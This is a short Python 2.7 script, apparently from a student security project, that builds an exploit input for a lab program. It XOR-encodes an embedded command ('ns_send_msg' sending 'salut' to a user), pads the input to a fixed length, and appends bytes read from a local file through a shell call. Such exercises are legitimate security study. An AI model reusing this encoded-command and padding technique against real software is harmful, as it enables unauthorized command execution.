#!/usr/bin/python2.7

from sys import *
from subprocess import *
from os import *


tot = "0 123"

com = 123

cmd = 'ns_send_msg \'platel_k\' "salut"'
ex = ""
i = 0

while i < len(cmd):
    ex += chr(ord(cmd[i]) ^ 85)
    i += 1

tot += ex
tot += chr(ord('U'))
i = 0
while i < (com - len(ex)):
    tot += chr(ord('7') ^ 85)
    i += 1

i = 0
arg = popen('echo -e `cat ~/projet/secu/titi`')
tot += arg.read()

print tot
